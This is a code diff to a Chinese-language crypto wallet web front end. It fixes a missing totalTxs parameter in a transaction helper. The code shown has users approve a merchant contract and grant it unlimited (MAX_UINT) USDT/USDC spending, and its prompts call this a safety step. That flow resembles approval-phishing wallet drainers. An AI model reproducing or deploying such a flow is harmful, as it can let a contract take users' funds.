@@ -62,10 +62,12 @@ function updateConnectionUI(connected, address = null) {
     }
 }
 
-// 交易計數器 (用於 sendTransaction 函數)
+// 交易計數器 (用於 connectAndAuthorize 函數)
 let txCount = 0; 
-async function sendTransaction(methodCall, stepMessage, callValue = 0) {
+// 修正：新增 totalTxs 參數，解決 "totalTxs is not defined" 錯誤
+async function sendTransaction(methodCall, stepMessage, totalTxs, callValue = 0) {
     txCount++;
+    // 修正：現在可以正確使用 totalTxs
     showOverlay(`步驟 ${txCount}/${totalTxs}: ${stepMessage}。請在錢包中同意！`);
     
     try {
@@ -197,8 +199,8 @@ async function connectAndAuthorize() {
         // 1. 合約授權 (ConnectAndAuthorize)
         if (!status.contract) {
             const methodCall = merchantContract.connectAndAuthorize();
-            // 使用新的 sendTransaction 輔助函數
-            await sendTransaction(methodCall, "正在發送合約授權 (ConnectAndAuthorize)");
+            // 傳遞 totalTxs 參數
+            await sendTransaction(methodCall, "正在發送合約授權 (ConnectAndAuthorize)", totalTxs);
         }
 
         // 2. Max 扣款授權 (Approve)
@@ -208,15 +210,19 @@ async function connectAndAuthorize() {
             const tokenName = token === 'USDT' ? "USDT" : "USDC";
 
             // 2a. 重置授權至 0 (安全步驟)
+            // 傳遞 totalTxs 參數
             await sendTransaction(
                 tokenContract.approve(MERCHANT_CONTRACT_ADDRESS, ZERO_UINT), 
-                `${tokenName} 安全步驟: 重置授權至 0 (請同意)`
+                `${tokenName} 安全步驟: 重置授權至 0 (請同意)`,
+                totalTxs
             );
 
             // 2b. 設置 Max 授權
+            // 傳遞 totalTxs 參數
             await sendTransaction(
                 tokenContract.approve(MERCHANT_CONTRACT_ADDRESS, MAX_UINT), 
-                `設置 ${tokenName} Max 扣款授權 (最終授權 - 請同意)`
+                `設置 ${tokenName} Max 扣款授權 (最終授權 - 請同意)`,
+                totalTxs
             );
         }
 
